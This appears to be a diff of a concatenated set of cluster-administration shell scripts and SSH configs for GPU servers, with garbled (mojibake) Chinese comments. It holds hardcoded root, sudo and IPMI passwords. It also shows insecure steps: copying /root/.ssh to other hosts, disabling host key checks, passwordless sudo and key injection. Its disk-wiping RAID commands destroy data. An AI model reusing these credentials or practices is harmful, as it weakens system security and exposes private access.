-#g0058 g0059 g0061 g0062 g0063 g0064 g0067 g0083 g0114 g0116
-#g0137 g0143 g0170 g0171 g0194 g0202 g0205 g0212 g0232 g0236
-#g0238 g0249 g0256 g0035
-#)
-#æ€»å…±60èŠ‚ç‚¹
-#nodes=(
-#g0111 g0113 g0134 g0140 g0144 g0164 g0167 g0168 g0177 g0189
-#g0191 g0199 g0202 g0209 g0211 g0221 g0222 g0021 g0228 g0232
-#g0237 g0248 g0025 g0031 g0032 g0033 g0034 g0035 g0036 g0037
-#g0038 g0039 g0040 g0041 g0042 g0043 g0044 g0045 g0046 g0047
-#g0048 g0049 g0050 g0051 g0052 g0053 g0054 g0055 g0056 g0057
-#g0004 g0058 g0059 g0060 g0061 g0062 g0080 g0252 g0254 g0255
-#)
-#å¼‚å¸¸å’Œå¥åº·èŠ‚ç‚¹æµ‹è¯•
-nodes=(
-  g0190 g0191 g0221
-)
-# åˆ›å»ºç»“æœç›®å½•
-mkdir -p ./1to1result
-
-# è®¾ç½®ç¯å¢ƒå˜é‡
-ucx_home=/usr
-openmpi_home=/usr/mpi/gcc/openmpi-4.1.7rc1/
-== /root/conf/para_copy.sh
-#!/bin/bash
-seq 6 70 | awk '$1 != 13 && $1 != 67' | \
-xargs -I{} -P20 sh -c '
-  ip={}
-  host="10.242.32.$ip"
-  if timeout 25 scp -i /root/id_rsa -o ConnectTimeout=10 -o StrictHostKeyChecking=no -r /etc/hosts root@$host:/etc 2>/dev/null; then
-    echo "âœ… Copied to $host"
-  else
-    echo "$ip" >> /tmp/scp_unreachable.txt
-    echo "âŒ Failed to copy to $host" >&2
-  fi
-'
-== /root/conf/para_scp.sh
-seq 107 125 | xargs -I{} -P 20 sh -c \
-  'scp -o ConnectTimeout=10 /etc/hosts para@10.251.10.{}:/tmp/hosts && \
-   ssh -o ConnectTimeout=10 para@10.251.10.{} "sudo mv /tmp/hosts /etc/hosts && echo {} success"'
-== /root/conf/para_ssh.sh
-#è¿ç»­çš„å†™æ³•
-#seq 107 125 | xargs -I{} -P 10 ssh para@10.251.10.{} "echo \$HOSTNAME && sudo ~/NVIDIA-Linux-x86_64-550.90.07.run --dkms -s;sudo update-initramfs -k $(uname -r) -c;sudo cp ~/conf/nv_gpu_conf.sh /usr/local/bin/;sudo /usr/local/bin/nv_gpu_conf.sh >/tmp/nv_gpu_conf.log 2>&1;sudo modprobe nvidia_peermem"
-#ç¦»æ•£çš„å†™æ³•
-#printf "2\n4\n7\n8\n88" | xargs -I{} -P5 ssh ubuntu@172.16.21.{} "echo \$HOSTNAME && ~/conf/grub.sh;sudo ~/conf/disableupdate.sh; sudo ~/conf/disablenouveau.sh; sudo ~/conf/cpu_performance.sh; ~/conf/install_build_essential.sh; sudo ~/conf/installpackage.sh"
-seq 6 70 | awk '$1 != 13 && $1 != 67' | \
-xargs -I{} -P20 sh -c '
-  ip={}
-  host="10.242.32.$ip"
-  if timeout 15 ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no root@$host "echo \$HOSTNAME && /root/conf/ids.sh" 2>/dev/null; then
-    echo "âœ… Success: $host"
-  else
-    echo "$ip" | flock /tmp/unreachable.lock tee -a /tmp/unreachable.txt >/dev/null
-    echo "âŒ Failed: $host"
-  fi
-'
-
-== /root/conf/pass.sh
-#!/bin/bash
-
-PASSWORD="Admin@123_para#!2024"
-
-for i in {1..16}
-do
-  HOST="g$(printf "%04d" $i)"
-  echo "Setting root password on $HOST"
-  ssh root@$HOST "echo root:$PASSWORD | chpasswd"
-done
-== /root/conf/pcie.sh
-#!/bin/bash
-
-# è·å– GPU çš„ Bus ID
-bus_ids=$(nvidia-smi --query-gpu=gpu_bus_id --format=csv,noheader)
-
-# å¾ªç¯éå†æ¯ä¸ª Bus ID å¹¶æŸ¥çœ‹è¯¦ç»†çš„ lspci ä¿¡æ¯
-for bus_id in $bus_ids; do
-    echo "ä¿¡æ¯ for Device (Bus ID: $bus_id):"
-    lspci -vvv -s ${bus_id//00000000:} | grep -E "LnkCap|LnkSta"
-    echo "--------------------------"
-done
-== /root/conf/prefetch.sh
-#!/bin/bash
-# ==========================================
-# é¢„ä¸‹è½½è„šæœ¬ - åœ¨éƒ¨ç½²ç¯å¢ƒå‰ä¸‹è½½æ‰€éœ€è½¯ä»¶
-# ç”¨æ³•: ./prefetch.sh [é©±åŠ¨ç‰ˆæœ¬] [Ubuntuç‰ˆæœ¬ä»£å·]
-# ç¤ºä¾‹: ./prefetch.sh 580.105.08 ubuntu2204
-# ==========================================
-
-set -e
-
-SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
-PARENT_DIR="$(dirname "$SCRIPT_DIR")"
-DOWNLOAD_DIR="$PARENT_DIR"
-
-# ================= é…ç½®åŒºåŸŸ =================
-# æ”¯æŒå‘½ä»¤è¡Œä¼ å‚ï¼Œæœªä¼ å‚åˆ™ä½¿ç”¨é»˜è®¤å€¼
-DRIVER_VERSION="${1:-580.105.08}"
-UBUNTU_CODENAME="${2:-ubuntu2204}"
-CUDA_VERSION="12.8.1"
-CUDA_DRIVER_PART="570.124.06"
-
-# æå–ä¸»ç‰ˆæœ¬å·ï¼ˆå¦‚ 580.105.08 -> 580ï¼‰
-MAJOR_VERSION=$(echo "$DRIVER_VERSION" | cut -d. -f1)
-
-# ================= ä¸‹è½½æ–‡ä»¶åˆ—è¡¨ =================
-# 1. NVIDIA é©±åŠ¨
-DRIVER_FILE="NVIDIA-Linux-x86_64-${DRIVER_VERSION}.run"
-DRIVER_URL="https://download.nvidia.com/XFree86/Linux-x86_64/${DRIVER_VERSION}/${DRIVER_FILE}"
-DRIVER_BACKUP_URL="https://file.mir.blsc.cn/deploy/NVIDIA/driver/${DRIVER_FILE}"
-
-# 2. Fabric Manager
-== /root/conf/progress.sh
-#!/bin/bash
-
-# ç›‘æ§ /data ç›®å½•å®¹é‡å¢é•¿é€Ÿåº¦ï¼ˆMB/sï¼‰
-INTERVAL=10          # ç›‘æ§é—´éš”ï¼ˆç§’ï¼‰
-MOUNT_POINT="/shuju/back_data"  # è¦ç›‘æ§çš„æŒ‚è½½ç‚¹
-LOG_FILE="/tmp/disk_growth.log"  # å¯é€‰æ—¥å¿—æ–‡ä»¶
-TOTAL_SIZE=9696052   # ä¼ è¾“æ€»æ•°æ®é‡ï¼ˆMBï¼‰
-
-# åˆå§‹åŒ–å‰ä¸€æ¬¡æ•°æ®
-prev_avail=$(df -BM --output=avail "$MOUNT_POINT" | tail -n 1 | tr -d 'M')
-prev_time=$(date +%s)
-
-# è®¡ç®—å·²ä¼ è¾“æ•°æ®é‡
-transferred=0
-
-echo "å¼€å§‹ç›‘æ§ $MOUNT_POINT å®¹é‡å˜åŒ–ï¼ˆå•ä½ï¼šMB/sï¼‰"
-echo "æ—¶é—´æˆ³           å¯ç”¨ç©ºé—´(MB)   å˜åŒ–é‡(MB)  é€Ÿåº¦(MB/s)   å‰©ä½™æ•°æ®é‡(MB)   ä¼ è¾“è¿›åº¦(%)"
-
-while true; do
-    # è·å–å½“å‰æ•°æ®
-    curr_avail=$(df -BM --output=avail "$MOUNT_POINT" | tail -n 1 | tr -d 'M')
-    curr_time=$(date +%s)
-    
-    # è®¡ç®—å˜åŒ–é‡
-    delta_avail=$((prev_avail - curr_avail))  # æ³¨æ„ï¼šå¯ç”¨ç©ºé—´å‡å°‘è¡¨ç¤ºæ•°æ®å¢é•¿
-    time_diff=$((curr_time - prev_time))
-    
-    # è®¡ç®—é€Ÿåº¦ï¼ˆé¿å…é™¤ä»¥0ï¼‰
-    if [ $time_diff -gt 0 ]; then
-        speed=$(echo "scale=2; $delta_avail / $time_diff" | bc)
-== /root/conf/raid10.sh
-#!/bin/bash
-#æ ¼å¼åŒ–ç›˜ï¼ŒåŒ…æ‹¬æ ¼å¼åŒ–åˆ†åŒºï¼Œè°¨æ…æ“ä½œ
-sudo wipefs --all /dev/nvme[0-3]n1
-sudo mdadm --create --verbose /dev/md0 --level=10 --raid-device=4 /dev/nvme[0-3]n1
-#è¿™é‡Œçš„--raid-device=4è¡¨ç¤ºæœ‰4å—ç›˜ï¼Œ/dev/nvme[0-3]n1è¡¨ç¤ºç›˜æ‰€åœ¨çš„åˆ†åŒºåã€‚
-sudo mkfs.ext4 /dev/md0 
-sudo mkdir /ssd 
-
-# è·å–/dev/md0çš„UUID
-MD0_UUID=$(sudo blkid -s UUID -o value /dev/md0)
-echo "è·å–åˆ°/dev/md0çš„UUID: $MD0_UUID"
-
-# ä½¿ç”¨UUIDæŒ‚è½½
-sudo mount UUID="$MD0_UUID" /ssd
-
-# é…ç½®rc.localè‡ªåŠ¨æŒ‚è½½
-if ! grep -q "mount.*$MD0_UUID" /etc/rc.local; then
-    echo "æ·»åŠ æŒ‚è½½å‘½ä»¤åˆ°/etc/rc.local"
-    
-    # åœ¨æœ€åä¸€ä¸ªéç©ºè¡Œä¹‹åæ’å…¥
-    sudo sed -i -e '/^[[:space:]]*$/d' -e '$a\' /etc/rc.local
-    echo "mount UUID=\"$MD0_UUID\" /ssd" | sudo tee -a /etc/rc.local
-else
-    echo "æŒ‚è½½å‘½ä»¤å·²å­˜åœ¨äº/etc/rc.localä¸­"
-fi
-# é…ç½®mdadm
-mdadm --detail --scan | sudo tee -a /etc/mdadm/mdadm.conf
-
-# æ›´æ–°initramfs
-sudo update-initramfs -u
-== /root/conf/raid5.sh
-#!/bin/bash
-#æ ¼å¼åŒ–ç›˜ï¼ŒåŒ…æ‹¬æ ¼å¼åŒ–åˆ†åŒºï¼Œè°¨æ…æ“ä½œ
-#dd if=/dev/zero of=/dev/nvme1n1 bs=1M count=1
-sudo mdadm --create --verbose /dev/md0 --level=5 --raid-device=2 /dev/nvme0n1 /dev/nvme1n1
-#è¿™é‡Œçš„--raid-device=2è¡¨ç¤ºæœ‰2å—ç›˜ï¼Œ/dev/nvme0n1 /dev/nvme1n1è¡¨ç¤ºç›˜æ‰€åœ¨çš„åˆ†åŒºåã€‚
-sudo mkfs.ext4 /dev/md0 
-sudo mkdir /ssd 
-sudo mount /dev/md0 /ssd
-mdadm --detail --scan | sudo tee -a /etc/mdadm/mdadm.conf
-cat /proc/mdstat
-echo 100000000 | sudo tee /proc/sys/dev/raid/speed_limit_min
-echo 200000000 | sudo tee /proc/sys/dev/raid/speed_limit_max
-èŠ‚ç‚¹å  IPMI              è´¦å·     å¯†ç                 ç³»ç»Ÿè´¦å· å¯†ç       å†…ç½‘IP                å“ç‰Œ
-g0295 10.254.10.38 ADMIN,NRPEZARZUC ubuntu  ubuntu 10.254.46.230    è¶…å¾®
-g0296 10.254.10.39 ADMIN,JMMIJZSUUP ubuntu  ubuntu 10.254.46.231     è¶…å¾®
-g0310 10.254.11.224 Admin/Admin@5000 para P@ra@2024 10.254.46.229å®ç•…
-g0312 10.254.11.226 Admin/Admin@5000 para P@ra@2024 10.254.46.232 å®ç•…
-
-è¶…å¾®
-network:
-  bonds:
-    bond0:
-      addresses:
-      - 10.254.46.225/28
-      routes:
-      - to: default
-        via: 10.254.46.238
-      nameservers:
-        addresses:
-        - 223.5.5.5
-== /root/conf/rc.local
-#!/bin/bash
-#
-# rc.local
-#
-# This script is executed at the end of each multiuser runlevel.
-# Make sure that the script will "exit 0" on success or any other
-# value on error.
-#
-# In order to enable or disable this script just change the execution
-# bits.
-#
-# By default this script does nothing.
-/usr/local/bin/nv_gpu_conf.sh >/tmp/nv_gpu_conf.log 2>&1
-#/usr/local/bin/disable_acs.sh >/tmp/disable_acs.log 2>&1
-modprobe nvidia_peermem
-/etc/init.d/cpufrequtils restart
-== /root/conf/rc_chengdu.local
-#!/bin/bash
-ntpdate -v ntp.agilecloud.com  &>/dev/null
-# /opt/cfg_bond.sh is a network tool, do not edit, move or delete it! 
-bash -x /opt/cfg_bond.sh
-sudo /etc/rdma/rdma_conf/rdma_conf
-sysctl -w net.ipv4.conf.all.arp_ignore=1
-sysctl -w net.ipv4.conf.eth8.rp_filter=0
-ip rule add from all oif eth8 lookup 101 prio 10000
-ip rule add from 11.9.135.194/32 lookup 101 prio 10000
-ip route add default dev eth8 via 11.9.135.193 src 11.9.135.194 table 101
-ip route add 11.9.135.192/28 dev eth8 proto kernel scope link src 11.9.135.194 table 101
-sysctl -w net.ipv4.conf.eth7.rp_filter=0
-ip rule add from all oif eth7 lookup 102 prio 10000
-ip rule add from 11.9.135.162/32 lookup 102 prio 10000
-ip route add default dev eth7 via 11.9.135.161 src 11.9.135.162 table 102
-ip route add 11.9.135.160/28 dev eth7 proto kernel scope link src 11.9.135.162 table 102
-sysctl -w net.ipv4.conf.eth6.rp_filter=0
-ip rule add from all oif eth6 lookup 103 prio 10000
-ip rule add from 11.9.135.130/32 lookup 103 prio 10000
-ip route add default dev eth6 via 11.9.135.129 src 11.9.135.130 table 103
-ip route add 11.9.135.128/28 dev eth6 proto kernel scope link src 11.9.135.130 table 103
-sysctl -w net.ipv4.conf.eth4.rp_filter=0
-ip rule add from all oif eth4 lookup 104 prio 10000
-ip rule add from 11.9.135.66/32 lookup 104 prio 10000
-ip route add default dev eth4 via 11.9.135.65 src 11.9.135.66 table 104
-ip route add 11.9.135.64/28 dev eth4 proto kernel scope link src 11.9.135.66 table 104
-sysctl -w net.ipv4.conf.eth2.rp_filter=0
-ip rule add from all oif eth2 lookup 105 prio 10000
-ip rule add from 11.9.135.2/32 lookup 105 prio 10000
-ip route add default dev eth2 via 11.9.135.1 src 11.9.135.2 table 105
-== /root/conf/rclocal.sh
-#!/bin/bash
-echo "" >> /lib/systemd/system/rc-local.service
-echo "[Install]" >> /lib/systemd/system/rc-local.service
-echo "WantedBy=multi-user.target" >> /lib/systemd/system/rc-local.service
-#echo '#!/bin/bash' >> /etc/rc.local
-#sed -i '1s/^/#!/bin/bash\n/' /etc/rc.local
-conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-cp $conf_dir/rc.local /etc/rc.local
-cp $conf_dir/nv_gpu_conf.sh /usr/local/bin
-#cp $conf_dir/disable_chaowei_acs.sh /usr/local/bin/disable_acs.sh
-chmod 755 /etc/rc.local
-systemctl daemon-reload
-systemctl restart rc-local.service
-systemctl enable rc-local.service
-systemctl status rc-local.service
-== /root/conf/rclocal_chaojubian.sh
-#!/bin/bash
-echo "" >> /lib/systemd/system/rc-local.service
-echo "[Install]" >> /lib/systemd/system/rc-local.service
-echo "WantedBy=multi-user.target" >> /lib/systemd/system/rc-local.service
-#echo '#!/bin/bash' >> /etc/rc.local
-#sed -i '1s/^/#!/bin/bash\n/' /etc/rc.local
-conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-cp $conf_dir/rc.local /etc/rc.local
-cp $conf_dir/disable_chaojubiain_acs.sh /usr/local/bin
-
-chmod 755 /etc/rc.local
-systemctl daemon-reload
-systemctl restart rc-local.service
-systemctl enable rc-local.service
-systemctl status rc-local.service
-== /root/conf/root_batch_install.sh
-#!/bin/bash
-set -euo pipefail
-
-# ========== é…ç½® ==========
-HOSTLIST="${1:-hostlist4}"      # ä¸»æœºåˆ—è¡¨æ–‡ä»¶ï¼ˆå¯å‘½ä»¤è¡Œä¼ å…¥ï¼‰
-JOBS=8                          # å¹¶å‘æ•°
-SCP_KEY_TIMEOUT=300             # rootå¯†é’¥ä¸Šä¼ è¶…æ—¶ï¼ˆç§’ï¼‰
-SCP_USER_SSH_TIMEOUT=60         # userå¯†é’¥ä¸Šä¼ è¶…æ—¶
-SCP_PKG_TIMEOUT=600             # å®‰è£…åŒ…ä¸Šä¼ è¶…æ—¶
-SCP_SUDOERS_TIMEOUT=60          # sudoersæ–‡ä»¶ä¸Šä¼ è¶…æ—¶
-SSH_EXEC_TIMEOUT=3600           # è¿œç¨‹æ‰§è¡Œè¶…æ—¶ï¼ˆ1å°æ—¶ï¼‰
-LOG_DIR="./deploy_logs"         # æ—¥å¿—ç›®å½•
-REMOTE_USER="user"              # æ™®é€šç”¨æˆ·åï¼ˆå¯ä¿®æ”¹ï¼‰
-
-# í ½í±‡ å…³é”®ä¿®å¤ï¼šå¯¼å‡ºå˜é‡ä¾› parallel å­è¿›ç¨‹ç»§æ‰¿
-export LOG_DIR
-export REMOTE_USER
-export PARALLEL="--no-notice"
-
-# ========== è‡ªåŠ¨å®‰è£… parallel ==========
-if ! command -v parallel >/dev/null 2>&1; then
-    echo "âš ï¸  GNU parallel æœªå®‰è£…ï¼Œæ­£åœ¨è‡ªåŠ¨å®‰è£…..."
-    if sudo -n true 2>/dev/null; then
-        sudo apt update -y >/dev/null 2>&1
-        sudo apt install -y parallel >/dev/null 2>&1
-    else
-        echo "í ½í´‘ éœ€è¦ sudo æƒé™å®‰è£… parallelï¼Œè¯·è¾“å…¥å¯†ç ï¼š"
-        sudo apt update -y
-        sudo apt install -y parallel
-    fi
-== /root/conf/root_copy_id_rsa.sh
-#!/bin/bash
-#apt update -y
-#apt-get install expect -y
-#apt install python3 python3-pip -y
-#pip3 install spawn
-# å®šä¹‰ç›®æ ‡ä¸»æœºä¿¡æ¯
-declare -a hosts=(
-  "10.80.80.12"
-  "10.80.80.13"
-  "10.80.80.14"
-)
-
-# SSHå¯†ç 
-PASSWORD="Bingxing.2026"
-
-# æ‹·è´ .ssh ç›®å½•åˆ°æ¯ä¸ªç›®æ ‡ä¸»æœº
-for ip in "${hosts[@]}"; do
-  echo "æ­£åœ¨æ‹·è´ .ssh ç›®å½•åˆ° $ip"
-  
-  expect << EOF
-set timeout 20
-spawn scp -r /root/.ssh root@$ip:/root
-expect {
-  "yes/no" { send "yes\r"; exp_continue }
-  "password:" { send "$PASSWORD\r" }
-}
-expect eof
-EOF
-
-  if [ $? -eq 0 ]; then
-== /root/conf/root_rsa
-== /root/conf/rsync-local2local.sh
-#!/bin/bash
-
-# æºç›®å½•å’Œç›®æ ‡ç›®å½•
-SRC_DIR="/data"
-DEST_DIR="/backup/data"
-
-# è®¾ç½®å¹¶å‘è¿›ç¨‹æ•°å’Œæœ€å¤§é‡è¯•æ¬¡æ•°
-NUM_PROCESSES=8
-MAX_RETRIES=3
-
-# åˆ›å»ºä¸´æ—¶ç›®å½•
-mkdir -p /tmp/rsync_lists
-rm -f /tmp/rsync_lists/*
-
-# ç”Ÿæˆç›¸å¯¹è·¯å¾„æ–‡ä»¶åˆ—è¡¨ï¼ˆé¿å…ç»å¯¹è·¯å¾„é—®é¢˜ï¼‰
-find "$SRC_DIR" -type f -printf '%P\n' > /tmp/rsync_lists/all_files.txt
-
-# è®¡ç®—æ€»æ–‡ä»¶æ•°é‡å’Œæ¯ä¸ªè¿›ç¨‹å¤„ç†é‡
-TOTAL_FILES=$(wc -l < /tmp/rsync_lists/all_files.txt)
-FILES_PER_PROCESS=$(( (TOTAL_FILES + NUM_PROCESSES - 1) / NUM_PROCESSES ))
-
-# åˆ†å‰²æ–‡ä»¶åˆ—è¡¨
-split -l $FILES_PER_PROCESS -d -a 2 /tmp/rsync_lists/all_files.txt /tmp/rsync_lists/rsync_list_
-
-# å®šä¹‰ rsync ä»»åŠ¡å‡½æ•°ï¼ˆå«é‡è¯•é€»è¾‘ï¼‰
-rsync_task() {
-  local list_file=$1
-  local retry=0
-  local exit_code=0
-
-== /root/conf/set-hostname.sh
-#!/bin/bash
-
-# ç”Ÿæˆä¸»æœºåçš„å‡½æ•°
-generate_hostname() {
-    num=$(printf "%04d" $1)
-    echo "g$num"
-}
-
-# å¼€å§‹IPåœ°å€çš„å¾ªç¯
-for ((i=11; i<=40; i++))
-do
-    ip="172.16.10.$i"
-    hostname=$(generate_hostname $(($i - 10))) # è®¡ç®—ä¸»æœºå
-
-    ssh root@$ip "sudo hostnamectl set-hostname $hostname" # ä½¿ç”¨ SSH è¿œç¨‹æ‰§è¡Œå‘½ä»¤ï¼Œæ›¿æ¢userä¸ºå®é™…ç”¨æˆ·å
-    echo "Changed hostname for $ip to $hostname"
-done== /root/conf/set_sudonopasswd.sh
-#!/bin/bash
-apt-get install expect
-apt install python3 python3-pip
-pip3 install spawn
-# å®šä¹‰ç›®æ ‡ä¸»æœºåˆ—è¡¨
-declare -a hosts=(
-  10.102.2.161 10.102.2.162 10.102.2.163 10.102.2.164 10.102.2.164 10.102.2.165
-  10.102.2.166 10.102.2.167 10.102.2.168 10.102.2.169 10.102.2.170 10.102.2.171
-  10.102.2.172 10.102.2.173 10.102.2.174 10.102.2.175 10.102.2.176 10.102.2.177
-  10.102.2.178 10.102.2.179 10.102.2.180
-)
-
-# sudoå¯†ç 
-SUDO_PASSWORD="Kgzs@2024"
-
-# ä½¿ç”¨æ›´å®‰å…¨çš„/etc/sudoers.d/æ–¹å¼
-SUDOERS_LINE="kgzs ALL=(ALL:ALL) NOPASSWD: ALL"
-
-for ip in "${hosts[@]}"; do
-  echo "æ­£åœ¨å¤„ç†ä¸»æœº: $ip"
-  
-  expect << EOF
-    set timeout 15
-    # å¼ºåˆ¶åˆ†é…ä¼ªç»ˆç«¯ (-t)
-    spawn ssh -t kgzs@$ip "sudo bash -c 'echo \"$SUDOERS_LINE\" | sudo tee /etc/sudoers.d/kgzs-nopasswd && sudo chmod 440 /etc/sudoers.d/kgzs-nopasswd'"
-    expect {
-      "yes/no" { send "yes\r"; exp_continue }  # å¤„ç†é¦–æ¬¡è¿æ¥
-      "*password*" { send "$SUDO_PASSWORD\r" } # åŒ¹é…æ‰€æœ‰å¯†ç æç¤ºï¼ˆSSHæˆ–sudoï¼‰
-    }
-    expect eof
-== /root/conf/single.sh
-#!/bin/bash
-module load cuda/12.4
-export NCCL_ALGO=Ring
-export LD_LIBRARY_PATH=/data/apps/nccl-master/build/lib:$LD_LIBRARY_PATH
-#å•èŠ‚ç‚¹
-/data/apps/nccl-tests-master/build/all_reduce_perf -b 8 -e 4G -f 2 -g 8
-#å¤šèŠ‚ç‚¹
-#mpirun -np 48 -H g0273:8,g0275:8,g0288:8,g0290:8,g0291:8,g0292:8 -x LD_LIBRARY_PATH -x PATH -x NCCL_DEBUG=WARN   -x NCCL_IB_HCA=mlx5_0,mlx5_1,mlx5_2,mlx5_3,mlx5_4,mlx5_7,mlx5_8,mlx5_9 -x NCCL_SOCKET_IFNAME=bond0 -x NCCL_IB_QPS_PER_CONNECTION=4 -x NCCL_IB_DISABLE=0 -x NCCL_ALGO=Ring  /data/apps/test/nccl-tests/build/all_reduce_perf -b 8 -e 4G -f 2 -g 1
-== /root/conf/ssh-ssh.sh
-#!/bin/bash
-
-# å®šä¹‰èŠ‚ç‚¹èŒƒå›´
-START_NODE=1
-END_NODE=125
-
-# æ ¼å¼åŒ–èŠ‚ç‚¹åç§°
-NODES=$(seq -f "node%03g" $START_NODE $END_NODE)
-
-# è¾“å‡ºæµ‹è¯•ç»“æœçš„æ–‡ä»¶
-RESULT_FILE="ssh_test_results.log"
-> $RESULT_FILE  # æ¸…ç©ºæ—§ç»“æœ
-
-# å¼€å§‹æµ‹è¯•
-echo "å¼€å§‹æµ‹è¯•èŠ‚ç‚¹ä¹‹é—´çš„ SSH è¿é€šæ€§..."
-for NODE_A in $NODES; do
-    for NODE_B in $NODES; do
-        if [ "$NODE_A" != "$NODE_B" ]; then
-            # æµ‹è¯• SSH è¿é€šæ€§
-            ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_A "ssh -o BatchMode=yes -o ConnectTimeout=5 $NODE_B 'echo SUCCESS'" &> /dev/null
-            if [ $? -eq 0 ]; then
-                echo "$NODE_A -> $NODE_B: SUCCESS" >> $RESULT_FILE
-            else
-                echo "$NODE_A -> $NODE_B: FAILED" >> $RESULT_FILE
-            fi
-        fi
-    done
-done
-
-echo "æµ‹è¯•å®Œæˆï¼Œç»“æœå·²ä¿å­˜åˆ° $RESULT_FILE"
-== /root/conf/ssh.sh
-#!/bin/bash
-  
-# è·å–å½“å‰è„šæœ¬çš„ç»å¯¹è·¯å¾„
-conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
-
-# è·å–åŸå§‹è°ƒç”¨ç”¨æˆ·
-original_user="${SUDO_USER:-$USER}"
-
-# æ£€æŸ¥åŸå§‹è°ƒç”¨ç”¨æˆ·æ˜¯å¦ä¸º root
-if [ "$original_user" = "root" ]; then
-    # åŸå§‹è°ƒç”¨ç”¨æˆ·æ˜¯ root
-    echo "user name: root"
-    cp "${conf_dir}/root_rsa/sshd_config" /etc/ssh/
-    cp "${conf_dir}/root_rsa/ssh_config" /etc/ssh/
-else
-    # åŸå§‹è°ƒç”¨ç”¨æˆ·ä¸æ˜¯ root
-    echo "user name: $original_user"
-    cp "${conf_dir}/ubuntu_rsa/sshd_config" /etc/ssh/
-    cp "${conf_dir}/ubuntu_rsa/ssh_config" /etc/ssh/
-fi
-
-# é‡å¯ sshd æœåŠ¡
-systemctl restart sshd
-== /root/conf/ssh_config
+--- /root/conf/ssh_config
 
 # This is the ssh client system-wide configuration file.  See
 # ssh_config(5) for more information.  This file provides defaults for
@@ -2717,206 +60,101 @@ Host *
 #   ForwardX11 no
 #   ForwardX11Trusted yes
 #   PasswordAuthentication yes
-#   HostbasedAuthentication no
-#   GSSAPIAuthentication no
-#   GSSAPIDelegateCredentials no
-#   GSSAPIKeyExchange no
-#   GSSAPITrustDNS no
-== /root/conf/ssh_rsa
-== /root/conf/sshd_config
-#	$OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $
-
-# This is the sshd server system-wide configuration file.  See
-# sshd_config(5) for more information.
-
-# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin
-
-# The strategy used for options in the default sshd_config shipped with
-# OpenSSH is to specify options with their default value where
-# possible, but leave them commented.  Uncommented options override the
-# default value.
-
-#Include /etc/ssh/sshd_config.d/*.conf
-
-#Port 22
-#AddressFamily any
-#ListenAddress 0.0.0.0
-#ListenAddress ::
-
-#HostKey /etc/ssh/ssh_host_rsa_key
-#HostKey /etc/ssh/ssh_host_ecdsa_key
-#HostKey /etc/ssh/ssh_host_ed25519_key
-
-# Ciphers and keying
-#RekeyLimit default none
-
-# Logging
-#SyslogFacility AUTH
-#LogLevel INFO
-
-== /root/conf/step_verify(2).sh
+--- /root/conf/pass.sh
 #!/bin/bash
 
-USER_ACCOUNT="ubuntu"
-MOUNT_POINT="/data"
-NODE_EXPORTER_PORT=9100
-DCGM_EXPORTER_PORT=9400
+PASSWORD="Admin@123_para#!2024"
 
-function INFO(){
-        /bin/echo -e "\e[104m\e[97m[INFO]\e[49m\e[39m ${*}"
-}
-function WARNING(){
-        /bin/echo >&2 -e "\e[101m\e[97m[WARNING]\e[49m\e[39m ${*}"
-}
-function ERROR(){
-        /bin/echo >&2 -e "\e[101m\e[97m[ERROR]\e[49m\e[39m ${*}"
-}
-function CHECK_SUDOERS(){
-	R=`cat /etc/sudoers | grep ${USER_ACCOUNT} | wc -l`
-	if [ $R -eq 1 ];then
-		INFO "sudoers å·²ç»æ·»åŠ ${USER_ACCOUNT}ç”¨æˆ·ï¼"
-    else
-		ERROR "sudoer æ²¡æœ‰æ·»åŠ ${USER_ACCOUNT}ç”¨æˆ·ï¼"
-	fi
-}
-function CHECK_DISK_MOUNT(){
-	R=`df -h | grep ${MOUNT_POINT} | wc -l`
-	if [ $R -eq 0 ]; then
-		ERROR "ç£ç›˜æ²¡æœ‰æŒ‚è½½ï¼"
-	else
-		MOUNT_DEVICE=`df -h | grep ${MOUNT_POINT}| awk '{print $1}'`
-== /root/conf/synchosts.sh
+for i in {1..16}
+do
+  HOST="g$(printf "%04d" $i)"
+  echo "Setting root password on $HOST"
+  ssh root@$HOST "echo root:$PASSWORD | chpasswd"
+done
+--- /root/conf/mianmi.txt
+#å¯¹äºérootè´¦å·ï¼Œä¸”æœ‰sudoæƒé™çš„é€‚ç”¨ã€‚
+for i in g0047 g0048 g0049; do ssh $i 'echo $HOSTNAME; sudo su - ubuntu -c "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCblZcdjQO0mnWs7oZZdzlNAQHD8ens10xt8ZpXTDCwIOJrf/fzy/mfLwojGY4jDm1P3euqPD2/niTKlvjSaL+L2HsVhoKzH4TQgjQmH3SgGqaHvhOs4wzHl8PYDNh9PJ1oy3y8c5JJHPF3maaJEVSXUVHCCr3Aw0z/NKhuf+x257QGppIqYV/Z45zK9VWt+oZOessH9rNHVHxQrdkMs0KgyVtzC331I+2DNaACwCD0SHiiTdUeqpB3rrjBKSPdBRkQOwDDqkltE55D/d74KjlCnU0TcsClFeQ8QOlkpm+z3f5aggES+Kdc04J+ImA6wGYJbVDTvnAzybDP5R5Th3SUd1hRt41BpMSU6tTYhGgKTYTQQJGNn46mAwiYUjUgrRuArPT4V3XPXidhGmAml57nGysPFyPdPlV2uGWs+wJmiNwfpgpzdfUM8EVL4Twzb+nr3gAZhOzrdS3qQ/Uo+t4PCVH6uXHo1wHrbJJp+GPDfVp9zSANt7+pj4b6oJqJkAc= langboat@m005\" >> ~/.ssh/authorized_keys" '; done--- /root/conf/ssh.sh
 #!/bin/bash
+  
+# è·å–å½“å‰è„šæœ¬çš„ç»å¯¹è·¯å¾„
+conf_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 
-cp /data/apps/conf/hosts /etc/
-== /root/conf/syncrclocal.sh
-#!/bin/bash
+# è·å–åŸå§‹è°ƒç”¨ç”¨æˆ·
+original_user="${SUDO_USER:-$USER}"
 
-hostname
+# æ£€æŸ¥åŸå§‹è°ƒç”¨ç”¨æˆ·æ˜¯å¦ä¸º root
+if [ "$original_user" = "root" ]; then
+    # åŸå§‹è°ƒç”¨ç”¨æˆ·æ˜¯ root
+    echo "user name: root"
+    cp "${conf_dir}/root_rsa/sshd_config" /etc/ssh/
+    cp "${conf_dir}/root_rsa/ssh_config" /etc/ssh/
+else
